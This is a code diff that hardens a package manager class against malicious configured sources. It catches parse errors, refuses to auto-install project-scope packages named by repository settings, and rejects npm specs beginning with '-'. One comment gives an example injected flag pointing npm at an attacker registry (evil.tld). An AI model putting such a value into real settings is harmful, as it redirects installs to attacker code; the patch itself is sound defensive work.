@@ -873,7 +873,13 @@ export class DefaultPackageManager implements PackageManager {
 	}
 
 	getInstalledPath(source: string, scope: "user" | "project"): string | undefined {
-		const parsed = this.parseSource(source);
+		let parsed: ParsedSource;
+		try {
+			parsed = this.parseSource(source);
+		} catch {
+			// An invalid configured source (see parseNpmSpec) has no install path.
+			return undefined;
+		}
 		if (parsed.type === "npm") {
 			const path = this.getNpmInstallPath(parsed, scope);
 			return existsSync(path) ? path : undefined;
@@ -1207,7 +1213,13 @@ export class DefaultPackageManager implements PackageManager {
 			)
 			.map((entry) => async (): Promise<PackageUpdate | undefined> => {
 				const source = typeof entry.pkg === "string" ? entry.pkg : entry.pkg.source;
-				const parsed = this.parseSource(source);
+				let parsed: ParsedSource;
+				try {
+					parsed = this.parseSource(source);
+				} catch {
+					// An invalid configured source (see parseNpmSpec) has no update to check.
+					return undefined;
+				}
 				if (parsed.type === "local" || parsed.pinned) {
 					return undefined;
 				}
@@ -1257,7 +1269,18 @@ export class DefaultPackageManager implements PackageManager {
 		for (const { pkg, scope } of sources) {
 			const sourceStr = typeof pkg === "string" ? pkg : pkg.source;
 			const filter = typeof pkg === "object" ? pkg : undefined;
-			const parsed = this.parseSource(sourceStr);
+			let parsed: ParsedSource;
+			try {
+				parsed = this.parseSource(sourceStr);
+			} catch (error) {
+				// A rejected source (e.g. an npm spec that would be parsed as a flag)
+				// must not abort the whole resolution or reach a child process.
+				accumulator.diagnostics.push({
+					type: "warning",
+					message: `Ignoring invalid package source "${sourceStr}": ${error instanceof Error ? error.message : String(error)}`,
+				});
+				continue;
+			}
 			const metadata: PathMetadata = { source: sourceStr, scope, origin: "package" };
 
 			if (parsed.type === "local") {
@@ -1271,6 +1294,22 @@ export class DefaultPackageManager implements PackageManager {
 					return false;
 				}
 				if (!onMissing) {
+					// A project-scope package is named by the cloned repository's
+					// settings, not by anything the user chose, and installing it runs
+					// repository-controlled code (npm postinstall, extension entry
+					// points). With no caller able to ask, the default is skip; the
+					// explicit `package install` command stays the consent path. User
+					// and temporary scopes keep the historical auto-install: both are
+					// sources the user configured themselves.
+					if (scope === "project") {
+						accumulator.diagnostics.push({
+							type: "warning",
+							message:
+								`Project package "${sourceStr}" needs an install or update and was skipped: project settings cannot ` +
+								`trigger an install without confirmation. Install it explicitly with \`prime-agent package install ${sourceStr} --local\`.`,
+						});
+						return false;
+					}
 					await this.installParsedSource(parsed, scope);
 					return true;
 				}
@@ -1703,7 +1742,14 @@ export class DefaultPackageManager implements PackageManager {
 
 		for (const entry of packages) {
 			const sourceStr = typeof entry.pkg === "string" ? entry.pkg : entry.pkg.source;
-			const identity = this.getPackageIdentity(sourceStr, entry.scope);
+			// A source the parser rejects (see parseNpmSpec) still needs a stable
+			// identity for dedupe; resolution reports and skips it downstream.
+			let identity: string;
+			try {
+				identity = this.getPackageIdentity(sourceStr, entry.scope);
+			} catch {
+				identity = `invalid:${entry.scope}:${sourceStr}`;
+			}
 
 			const existing = seen.get(identity);
 			if (!existing) {
@@ -1717,6 +1763,12 @@ export class DefaultPackageManager implements PackageManager {
 	}
 
 	private parseNpmSpec(spec: string): { name: string; version?: string } {
+		// A leading `-` makes npm parse the spec as a flag: `npm install -g
+		// --registry=https://evil.tld x` redirects the whole install to an attacker
+		// registry. Settings files reach this parser, so refuse the shape here.
+		if (spec.startsWith("-")) {
+			throw new Error(`Invalid npm package spec "${spec}": a spec must not start with "-".`);
+		}
 		const match = spec.match(/^(@?[^@]+(?:\/[^@]+)?)(?:@(.+))?$/);
 		if (!match) {
 			return { name: spec };
